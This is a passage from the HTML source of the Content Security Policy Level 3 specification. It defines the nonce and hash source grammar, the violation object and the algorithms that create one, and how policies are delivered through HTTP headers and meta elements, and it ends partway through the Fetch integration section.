<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-nonce-source">nonce-source</dfn>  = "'nonce-" <a data-link-type="grammar" href="#grammardef-base64-value" id="ref-for-grammardef-base64-value">base64-value</a> "'"
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-base64-value">base64-value</dfn>  = 1*( <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1①⓪">ALPHA</a> / <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1①①">DIGIT</a> / "+" / "/" / "-" / "_" )*2( "=" )

; Digests: 'sha256-[digest goes here]'
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-hash-source">hash-source</dfn>    = "'" <a data-link-type="grammar" href="#grammardef-hash-algorithm" id="ref-for-grammardef-hash-algorithm">hash-algorithm</a> "-" <a data-link-type="grammar" href="#grammardef-base64-value" id="ref-for-grammardef-base64-value①">base64-value</a> "'"
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-hash-algorithm">hash-algorithm</dfn> = "sha256" / "sha384" / "sha512"
</pre>
    <p>The <a data-link-type="grammar" href="#grammardef-host-char" id="ref-for-grammardef-host-char②">host-char</a> production intentionally contains only ASCII
  characters; internationalized domain names cannot be entered directly as part
  of a <a data-link-type="dfn" href="#serialized-csp" id="ref-for-serialized-csp①">serialized CSP</a>, but instead MUST be Punycode-encoded <a data-link-type="biblio" href="#biblio-rfc3492" title="Punycode: A Bootstring encoding of Unicode for Internationalized Domain Names in Applications (IDNA)">[RFC3492]</a>. For example, the domain <code>üüüüüü.de</code> MUST be represented as <code>xn--tdaaaaaa.de</code>.</p>
    <p class="note" role="note"><span class="marker">Note:</span> Though IP address do match the grammar above, only <code>127.0.0.1</code> will actually match a URL when used in a source
  expression (see <a href="#match-url-to-source-list">§ 6.6.2.5 Does url match source list in origin with redirect count?</a> for details). The security
  properties of IP addresses are suspect, and authors ought to prefer hostnames
  whenever possible.</p>
    <p class="note" role="note"><span class="marker">Note:</span> The <a data-link-type="grammar" href="#grammardef-base64-value" id="ref-for-grammardef-base64-value②">base64-value</a> grammar allows both <a data-link-type="dfn" href="https://tools.ietf.org/html/rfc4648#section-4" id="ref-for-section-4">base64</a> and <a data-link-type="dfn" href="https://tools.ietf.org/html/rfc4648#section-5" id="ref-for-section-5">base64url</a> encoding. These encodings are treated as equivalant when
  processing <a data-link-type="grammar" href="#grammardef-hash-source" id="ref-for-grammardef-hash-source①">hash-source</a> values. Nonces, however, are strict string matches:
  we use the <a data-link-type="grammar" href="#grammardef-base64-value" id="ref-for-grammardef-base64-value③">base64-value</a> grammar to limit the characters available, and
  reduce the complexity for the server-side operator (encodings, etc), but the user agent
  doesn’t actually care about any underlying value, nor does it do any decoding of the <a data-link-type="grammar" href="#grammardef-nonce-source" id="ref-for-grammardef-nonce-source①">nonce-source</a> value.</p>
    <h3 class="heading settled" data-level="2.4" id="framework-violation"><span class="secno">2.4. </span><span class="content">Violations</span><a class="self-link" href="#framework-violation"></a></h3>
    <p>A <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="violation">violation</dfn> represents an action or resource which goes against the
  set of <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object①④">policy</a> objects associated with a <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object①">global object</a>.</p>
    <p>Each <a data-link-type="dfn" href="#violation" id="ref-for-violation">violation</a> has a <dfn class="dfn-paneled" data-dfn-for="violation" data-dfn-type="dfn" data-export id="violation-global-object">global object</dfn>, which
  is the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object②">global object</a> whose <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object①⑤">policy</a> has been violated.</p>
    <p>Each <a data-link-type="dfn" href="#violation" id="ref-for-violation①">violation</a> has a <dfn class="dfn-paneled" data-dfn-for="violation" data-dfn-type="dfn" data-export id="violation-url">url</dfn> which is its <a data-link-type="dfn" href="#violation-global-object" id="ref-for-violation-global-object">global object</a>’s <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url">URL</a></code>.</p>
    <p>Each <a data-link-type="dfn" href="#violation" id="ref-for-violation②">violation</a> has a <dfn class="dfn-paneled" data-dfn-for="violation" data-dfn-type="dfn" data-export id="violation-status">status</dfn> which is a
  non-negative integer representing the HTTP status code of the resource for
  which the global object was instantiated.</p>
    <p>Each <a data-link-type="dfn" href="#violation" id="ref-for-violation③">violation</a> has a <dfn class="dfn-paneled" data-dfn-for="violation" data-dfn-type="dfn" data-export id="violation-resource">resource</dfn>, which is
  either <code>null</code>, "<code>inline</code>", "<code>eval</code>", or a <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url①">URL</a></code>. It represents the resource
  which violated the policy.</p>
    <p>Each <a data-link-type="dfn" href="#violation" id="ref-for-violation④">violation</a> has a <dfn class="dfn-paneled" data-dfn-for="violation" data-dfn-type="dfn" data-export id="violation-referrer">referrer</dfn>, which is either <code>null</code>, or a <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url②">URL</a></code>. It represents the referrer of the resource whose policy
  was violated.</p>
    <p>Each <a data-link-type="dfn" href="#violation" id="ref-for-violation⑤">violation</a> has a <dfn class="dfn-paneled" data-dfn-for="violation" data-dfn-type="dfn" data-export id="violation-policy">policy</dfn>, which is the <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object①⑥">policy</a> that has been violated.</p>
    <p>Each <a data-link-type="dfn" href="#violation" id="ref-for-violation⑥">violation</a> has a <dfn class="dfn-paneled" data-dfn-for="violation" data-dfn-type="dfn" data-export id="violation-disposition">disposition</dfn>, which is the <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition④">disposition</a> of the <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object①⑦">policy</a> that has been violated.</p>
    <p>Each <a data-link-type="dfn" href="#violation" id="ref-for-violation⑦">violation</a> has an <dfn class="dfn-paneled" data-dfn-for="violation" data-dfn-type="dfn" data-export id="violation-effective-directive">effective directive</dfn> which is a non-empty string representing the <a data-link-type="dfn" href="#directives" id="ref-for-directives⑥">directive</a> whose
  enforcement caused the violation.</p>
    <p>Each <a data-link-type="dfn" href="#violation" id="ref-for-violation⑧">violation</a> has a <dfn class="dfn-paneled" data-dfn-for="violation" data-dfn-type="dfn" data-export id="violation-source-file">source file</dfn>, which is
  either <code>null</code> or a <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url③">URL</a></code>.</p>
    <p>Each <a data-link-type="dfn" href="#violation" id="ref-for-violation⑨">violation</a> has a <dfn class="dfn-paneled" data-dfn-for="violation" data-dfn-type="dfn" data-export id="violation-line-number">line number</dfn>, which is
  a non-negative integer.</p>
    <p>Each <a data-link-type="dfn" href="#violation" id="ref-for-violation①⓪">violation</a> has a <dfn class="dfn-paneled" data-dfn-for="violation" data-dfn-type="dfn" data-export id="violation-column-number">column number</dfn>, which
  is a non-negative integer.</p>
    <p>Each <a data-link-type="dfn" href="#violation" id="ref-for-violation①①">violation</a> has a <dfn class="dfn-paneled" data-dfn-for="violation" data-dfn-type="dfn" data-export id="violation-element">element</dfn>, which is either <code>null</code> or an element.</p>
    <p>Each <a data-link-type="dfn" href="#violation" id="ref-for-violation①②">violation</a> has a <dfn class="dfn-paneled" data-dfn-for="violation" data-dfn-type="dfn" data-export id="violation-sample">sample</dfn>,
  which is a string. It is the empty string unless otherwise specified.</p>
    <p class="note" role="note"><span class="marker">Note:</span> A <a data-link-type="dfn" href="#violation" id="ref-for-violation①③">violation</a>’s <a data-link-type="dfn" href="#violation-sample" id="ref-for-violation-sample①">sample</a> will be populated with the first 40
  characters of an inline script, event handler, or style that caused an violation. Violations
  which stem from an external file will not include a sample in the violation report.</p>
    <h4 class="heading settled algorithm" data-algorithm="Create a violation object for global, policy, and directive" data-level="2.4.1" id="create-violation-for-global"><span class="secno">2.4.1. </span><span class="content"> Create a violation object for <var>global</var>, <var>policy</var>, and <var>directive</var> </span><a class="self-link" href="#create-violation-for-global"></a></h4>
    <p>Given a <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object③">global object</a> (<var>global</var>), a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object①⑧">policy</a> (<var>policy</var>), and a <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#string" id="ref-for-string⑥">string</a> (<var>directive</var>), the following algorithm creates a new <a data-link-type="dfn" href="#violation" id="ref-for-violation①④">violation</a> object, and populates it with an initial set of data:</p>
    <ol>
     <li data-md>
      <p>Let <var>violation</var> be a new <a data-link-type="dfn" href="#violation" id="ref-for-violation①⑤">violation</a> whose <a data-link-type="dfn" href="#violation-global-object" id="ref-for-violation-global-object①">global
  object</a> is <var>global</var>, <a data-link-type="dfn" href="#violation-policy" id="ref-for-violation-policy">policy</a> is <var>policy</var>, <a data-link-type="dfn" href="#violation-effective-directive" id="ref-for-violation-effective-directive">effective directive</a> is <var>directive</var>, and <a data-link-type="dfn" href="#violation-resource" id="ref-for-violation-resource">resource</a> is <code>null</code>.</p>
     <li data-md>
      <p>If the user agent is currently executing script, and can extract a source
  file’s URL, line number, and column number from the <var>global</var>, set <var>violation</var>’s <a data-link-type="dfn" href="#violation-source-file" id="ref-for-violation-source-file">source file</a>, <a data-link-type="dfn" href="#violation-line-number" id="ref-for-violation-line-number">line
  number</a>, and <a data-link-type="dfn" href="#violation-column-number" id="ref-for-violation-column-number">column number</a> accordingly.</p>
      <p class="issue" id="issue-ee968c9a"><a class="self-link" href="#issue-ee968c9a"></a> Is this kind of thing specified anywhere? I didn’t see anything
  that looked useful in <a data-link-type="biblio" href="#biblio-ecma262" title="ECMAScript® Language Specification">[ECMA262]</a>.</p>
      <p class="note" role="note"><span class="marker">Note:</span> User agents need to ensure that the <a data-link-type="dfn" href="#violation-source-file" id="ref-for-violation-source-file①">source file</a> is the URL requested by
  the page, pre-redirects. If that’s not possible, user agents need to strip the URL down to an
  origin to avoid unintentional leakage.</p>
     <li data-md>
      <p>If <var>global</var> is a <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#window" id="ref-for-window">Window</a></code> object, set <var>violation</var>’s <a data-link-type="dfn" href="#violation-referrer" id="ref-for-violation-referrer">referrer</a> to <var>global</var>’s <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#dom-document-2" id="ref-for-dom-document-2">document</a></code>'s <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/dom.html#dom-document-referrer" id="ref-for-dom-document-referrer">referrer</a></code>.</p>
     <li data-md>
      <p>Set <var>violation</var>’s <a data-link-type="dfn" href="#violation-status" id="ref-for-violation-status">status</a> to the HTTP status code
  for the resource associated with <var>violation</var>’s <a data-link-type="dfn" href="#violation-global-object" id="ref-for-violation-global-object②">global
  object</a>.</p>
      <p class="issue" id="issue-d43ce829"><a class="self-link" href="#issue-d43ce829"></a> How, exactly, do we get the status code? We don’t actually store it
  anywhere.</p>
     <li data-md>
      <p>Return <var>violation</var>.</p>
    </ol>
    <h4 class="heading settled algorithm" data-algorithm="Create a violation object for request, and policy." data-level="2.4.2" id="create-violation-for-request"><span class="secno">2.4.2. </span><span class="content"> Create a violation object for <var>request</var>, and <var>policy</var>. </span><a class="self-link" href="#create-violation-for-request"></a></h4>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑤">request</a> (<var>request</var>), a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object①⑨">policy</a> (<var>policy</var>),
  the following algorithm creates a new <a data-link-type="dfn" href="#violation" id="ref-for-violation①⑥">violation</a> object,
  and populates it with an initial set of data:</p>
    <ol>
     <li data-md>
      <p>Let <var>directive</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>Let <var>violation</var> be the result of executing <a href="#create-violation-for-global">§ 2.4.1 Create a violation object for global, policy, and directive</a> on <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-client" id="ref-for-concept-request-client">client</a>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global" id="ref-for-concept-settings-object-global">global object</a>, <var>policy</var>, and <var>directive</var>.</p>
     <li data-md>
      <p>Set <var>violation</var>’s <a data-link-type="dfn" href="#violation-resource" id="ref-for-violation-resource①">resource</a> to <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-url" id="ref-for-concept-request-url">url</a>.</p>
      <p class="note" role="note"><span class="marker">Note:</span> We use <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-url" id="ref-for-concept-request-url①">url</a>, and <em>not</em> its <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-current-url" id="ref-for-concept-request-current-url">current url</a>, as the latter might contain information
  about redirect targets to which the page MUST NOT be given access.</p>
     <li data-md>
      <p>Return <var>violation</var>.</p>
    </ol>
   </section>
   <section>
    <h2 class="heading settled" data-level="3" id="policy-delivery"><span class="secno">3. </span><span class="content"> Policy Delivery </span><a class="self-link" href="#policy-delivery"></a></h2>
    <p>A server MAY declare a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object②⓪">policy</a> for a particular <a data-link-type="dfn" href="https://tools.ietf.org/html/rfc7231#section-3" id="ref-for-section-3">resource
  representation</a> via an HTTP response header field whose value is a <a data-link-type="dfn" href="#serialized-csp" id="ref-for-serialized-csp②">serialized CSP</a>. This mechanism is defined in detail in <a href="#csp-header">§ 3.1 The Content-Security-Policy HTTP Response Header Field</a> and <a href="#cspro-header">§ 3.2 The Content-Security-Policy-Report-Only HTTP Response Header Field</a>, and the integration with Fetch
  and HTML is described in <a href="#fetch-integration">§ 4.1 Integration with Fetch</a> and <a href="#html-integration">§ 4.2 Integration with HTML</a>.</p>
    <p>A <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object②①">policy</a> may also be declared inline in an HTML document via a <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta">meta</a></code> element’s <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv" id="ref-for-attr-meta-http-equiv">http-equiv</a></code> attribute, as described in <a href="#meta-element">§ 3.3 The &lt;meta> element</a>.</p>
    <h3 class="heading settled" data-level="3.1" id="csp-header"><span class="secno">3.1. </span><span class="content"> The <code>Content-Security-Policy</code> HTTP Response Header Field </span><a class="self-link" href="#csp-header"></a></h3>
    <p>The <dfn class="dfn-paneled" data-dfn-type="http-header" data-export id="header-content-security-policy"><code>Content-Security-Policy</code></dfn> HTTP response header field is the preferred mechanism for delivering a policy from a server to a
  client. The header’s value is represented by the following ABNF <a data-link-type="biblio" href="#biblio-rfc5234" title="Augmented BNF for Syntax Specifications: ABNF">[RFC5234]</a>:</p>
<pre>Content-Security-Policy = 1#<a data-link-type="grammar" href="#grammardef-serialized-policy" id="ref-for-grammardef-serialized-policy①">serialized-policy</a>
                    ; The '#' rule is the one defined in section 7 of RFC 7230
                    ; but it incorporates the modifications specified
                    ; in section 2.1 of this document.
</pre>
    <div class="example" id="example-b2d2c295">
     <a class="self-link" href="#example-b2d2c295"></a> 
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①">Content-Security-Policy</a>: script-src 'self';
                         report-to csp-reporting-endpoint
</pre>
    </div>
    <p>A server MAY send different <code>Content-Security-Policy</code> header field
  values with different <a data-link-type="dfn" href="https://tools.ietf.org/html/rfc7231#section-3" id="ref-for-section-3①">representations</a> of the same resource.</p>
    <p>A server SHOULD NOT send more than one HTTP response header field named
  "<code>Content-Security-Policy</code>" with a given <a data-link-type="dfn" href="https://tools.ietf.org/html/rfc7231#section-3" id="ref-for-section-3②">resource
  representation</a>.</p>
    <p>When the user agent receives a <code>Content-Security-Policy</code> header field, it
  MUST <a data-link-type="abstract-op" href="#abstract-opdef-parse-a-serialized-csp" id="ref-for-abstract-opdef-parse-a-serialized-csp①">parse</a> and <a data-link-type="dfn" href="#enforced" id="ref-for-enforced">enforce</a> each <a data-link-type="dfn" href="#serialized-csp" id="ref-for-serialized-csp③">serialized CSP</a> it contains as described in <a href="#fetch-integration">§ 4.1 Integration with Fetch</a>, <a href="#html-integration">§ 4.2 Integration with HTML</a>.</p>
    <h3 class="heading settled" data-level="3.2" id="cspro-header"><span class="secno">3.2. </span><span class="content"> The <code>Content-Security-Policy-Report-Only</code> HTTP Response Header Field </span><a class="self-link" href="#cspro-header"></a></h3>
    <p>The <dfn class="dfn-paneled" data-dfn-type="http-header" data-export id="header-content-security-policy-report-only"><code>Content-Security-Policy-Report-Only</code></dfn> HTTP response header field allows web developers to experiment with policies by monitoring (but
  not enforcing) their effects. The header’s value is represented by the following ABNF <a data-link-type="biblio" href="#biblio-rfc5234" title="Augmented BNF for Syntax Specifications: ABNF">[RFC5234]</a>:</p>
<pre>Content-Security-Policy-Report-Only = 1#<a data-link-type="grammar" href="#grammardef-serialized-policy" id="ref-for-grammardef-serialized-policy②">serialized-policy</a>
                    ; The '#' rule is the one defined in section 7 of RFC 7230
                    ; but it incorporates the modifications specified
                    ; in section 2.1 of this document.
</pre>
    <p>This header field allows developers to piece together their security policy in
  an iterative fashion, deploying a report-only policy based on their best
  estimate of how their site behaves, watching for violation reports, and then
  moving to an enforced policy once they’ve gained confidence in that behavior.</p>
    <div class="example" id="example-5899b4f0">
     <a class="self-link" href="#example-5899b4f0"></a> 
<pre><a data-link-type="http-header" href="#header-content-security-policy-report-only" id="ref-for-header-content-security-policy-report-only">Content-Security-Policy-Report-Only</a>: script-src 'self';
                                     report-to csp-reporting-endpoint
</pre>
    </div>
    <p>A server MAY send different <code>Content-Security-Policy-Report-Only</code> header field values with different <a data-link-type="dfn" href="https://tools.ietf.org/html/rfc7231#section-3" id="ref-for-section-3③">representations</a> of the same
  resource.</p>
    <p>A server SHOULD NOT send more than one HTTP response header field named
  "<code>Content-Security-Policy-Report-Only</code>" with a given <a data-link-type="dfn" href="https://tools.ietf.org/html/rfc7231#section-3" id="ref-for-section-3④">resource
  representation</a>.</p>
    <p>When the user agent receives a <code>Content-Security-Policy-Report-Only</code> header
  field, it MUST <a data-link-type="abstract-op" href="#abstract-opdef-parse-a-serialized-csp" id="ref-for-abstract-opdef-parse-a-serialized-csp②">parse</a> and <a data-link-type="dfn" href="#monitored" id="ref-for-monitored">monitor</a> each <a data-link-type="dfn" href="#serialized-csp" id="ref-for-serialized-csp④">serialized CSP</a> it contains as described in <a href="#fetch-integration">§ 4.1 Integration with Fetch</a> and <a href="#html-integration">§ 4.2 Integration with HTML</a>.</p>
    <p class="note" role="note"><span class="marker">Note:</span> The <a data-link-type="http-header" href="#header-content-security-policy-report-only" id="ref-for-header-content-security-policy-report-only①"><code>Content-Security-Policy-Report-Only</code></a> header is <strong>not</strong> supported inside a <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta①">meta</a></code> element.</p>
    <h3 class="heading settled" data-level="3.3" id="meta-element"><span class="secno">3.3. </span><span class="content"> The <code>&lt;meta></code> element </span><a class="self-link" href="#meta-element"></a></h3>
    <p>A <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document③">Document</a></code> may deliver a policy via one or more HTML <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta②">meta</a></code> elements
  whose <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv" id="ref-for-attr-meta-http-equiv①">http-equiv</a></code> attributes are an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive">ASCII case-insensitive</a> match for the string "<code>Content-Security-Policy</code>". For example:</p>
    <div class="example" id="example-5b9d2837">
     <a class="self-link" href="#example-5b9d2837"></a> 
<pre class="highlight"><c- p>&lt;</c-><c- f>meta</c-> <c- e>http-equiv</c-><c- o>=</c-><c- s>"Content-Security-Policy"</c-> <c- e>content</c-><c- o>=</c-><c- s>"script-src 'self'"</c-><c- p>></c->
</pre>
    </div>
    <p>Implementation details can be found in HTML’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/#attr-meta-http-equiv-content-security-policy" id="ref-for-attr-meta-http-equiv-content-security-policy">Content Security Policy
  state</a> <code>http-equiv</code> processing instructions <a data-link-type="biblio" href="#biblio-html" title="HTML Standard">[HTML]</a>.</p>
    <p class="note" role="note"><span class="marker">Note:</span> The <a data-link-type="http-header" href="#header-content-security-policy-report-only" id="ref-for-header-content-security-policy-report-only②"><code>Content-Security-Policy-Report-Only</code></a> header is <em>not</em> supported inside a <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta③">meta</a></code> element. Neither are the <code>report-uri</code>, <code>frame-ancestors</code>, and <code>sandbox</code> directives.</p>
    <p>Authors are <em>strongly encouraged</em> to place <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta④">meta</a></code> elements as early
  in the document as possible, because policies in <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta⑤">meta</a></code> elements are not
  applied to content which precedes them. In particular, note that resources
  fetched or prefetched using the <code>Link</code> HTTP response header
  field, and resources fetched or prefetched using <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-link-element" id="ref-for-the-link-element">link</a></code> and <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script②">script</a></code> elements which precede a <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta⑥">meta</a></code>-delivered policy will not be blocked.</p>
    <p class="note" role="note"><span class="marker">Note:</span> A policy specified via a <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta⑦">meta</a></code> element will be enforced along with
  any other policies active for the protected resource, regardless
  of where they’re specified. The general impact of enforcing multiple
  policies is described in <a href="#multiple-policies">§ 8.1 The effect of multiple policies</a>.</p>
    <p class="note" role="note"><span class="marker">Note:</span> Modifications to the <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-content" id="ref-for-attr-meta-content">content</a></code> attribute of a <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta⑧">meta</a></code> element
  after the element has been parsed will be ignored.</p>
   </section>
   <section>
    <h2 class="heading settled" data-level="4" id="integrations"><span class="secno">4. </span><span class="content">Integrations</span><a class="self-link" href="#integrations"></a></h2>
    <p><em>This section is non-normative.</em></p>
    <p>This document defines a set of algorithms which are used in other
  specifications in order to implement the functionality. These
  integrations are outlined here for clarity, but those external
  documents are the normative references which ought to be consulted for
  detailed information.</p>
    <h3 class="heading settled" data-level="4.1" id="fetch-integration"><span class="secno">4.1. </span><span class="content"> Integration with Fetch </span><a class="self-link" href="#fetch-integration"></a></h3>
    <p>A number of <a data-link-type="dfn" href="#directives" id="ref-for-directives⑦">directives</a> control resource loading in one way or
  another. This specification provides algorithms which allow Fetch to make
  decisions about whether or not a particular <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑥">request</a> should be blocked
  or allowed, and about whether a particular <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response④">response</a> should be replaced
  with a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-network-error" id="ref-for-concept-network-error">network error</a>.</p>
    <ol>
     <li data-md>
      <p><a href="#should-block-request" id="ref-for-should-block-request①">§ 4.1.3 Should request be blocked by Content Security Policy?</a> is called as part of step 2.4 of the <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-main-fetch" id="ref-for-concept-main-fetch">Main
  Fetch</a> algorithm. This allows directives' <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check">pre-request checks</a> to be executed against each <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑦">request</a> before it hits the network,
  and against each redirect that a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑧">request</a> might go through on its
  way to reaching a resource.</p>
     <li data-md>
      <p><a href="#should-block-response" id="ref-for-should-block-response②">§ 4.1.4 Should response to request be blocked by Content Security Policy?</a> is called as part of step 11 of the <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-main-fetch" id="ref-for-concept-main-fetch①">Main
  Fetch</a> algorithm. This allows directives' <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check">post-request checks</a> and <a data-link-type="dfn" href="#directive-response-check" id="ref-for-directive-response-check">response checks</a> to be executed on the <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response⑤">response</a> delivered
  from the network or from a Service Worker.</p>
    </ol>
    <p>A <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object②②">policy</a> is generally enforced upon a <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object④">global object</a>, but the
  user agent needs to <a data-link-type="abstract-op" href="#abstract-opdef-parse-a-serialized-csp" id="ref-for-abstract-opdef-parse-a-serialized-csp③">parse</a> any policy
  delivered via an HTTP response header field before any <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object⑤">global object</a> is created in order to handle directives that require knowledge of a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response⑥">response</a>’s details. To that end:</p>
    <ol>
     <li data-md>
      <p>A <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response⑦">response</a> has an associated <a data-link-type="dfn">CSP list</a> which
  contains any policy objects delivered in the <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response⑧">response</a>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response-header-list" id="ref-for-concept-response-header-list">header list</a>.</p>
     <li data-md>
      <p><a href="#set-response-csp-list" id="ref-for-set-response-csp-list">§ 4.1.1 Set response’s CSP list</a> is called in the <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-http-fetch" id="ref-for-concept-http-fetch">HTTP fetch</a> and <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-http-network-fetch" id="ref-for-concept-http-network-fetch">HTTP-network fetch</a> algorithms.</p>
      <p class="note" role="note"><span class="marker">Note:</span> These two calls should ensure that a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response⑨">response</a>’s <a data-link-type="dfn">CSP list</a> is set, regardless of how the <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①⓪">response</a> is created. If we hit the network (via <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-http-network-fetch" id="ref-for-concept-http-network-fetch①">HTTP-network
  fetch</a>, then we parse the policy before we handle the <code>Set-Cookie</code> header. If we get a response from a Service Worker (via <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-http-fetch" id="ref-for-concept-http-fetch①">HTTP fetch</a>,
  we’ll process its <a data-link-type="dfn">CSP list</a> before handing the
  response back to our caller.</p>
      <p class="note" role="note"><span class="marker">Note:</span> A fetch request abides by the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object⑥">global object</a>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list">CSP list</a> including any redirects it might follow.
  Any <a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy②">Content-Security-Policy</a> headers found in a redirect
  response are ignored.</p>
    </ol>
    <h4 class="heading settled dfn-paneled algorithm" data-algorithm="Set response’s CSP list" data-dfn-type="dfn" data-export data-level="4.1.1" data-lt="Set response’s CSP list" id="set-response-csp-list"><span class="secno">4.1.1. </span><span class="content"> Set <var>response</var>’s CSP list </span><a class="self-link" href="#set-response-csp-list" id="ref-for-set-response-csp-list①"></a></h4>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①①">response</a> (<var>response</var>), this algorithm evaluates its <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response-header-list" id="ref-for-concept-response-header-list①">header list</a> for <a data-link-type="dfn" href="#serialized-csp" id="ref-for-serialized-csp⑤">serialized CSP</a> values, and
  populates its <a data-link-type="dfn">CSP list</a> accordingly:</p>
    <ol class="algorithm">
     <li data-md>
      <p>Set <var>response</var>’s <a data-link-type="dfn">CSP list</a> to the empty list.</p>
     <li data-md>
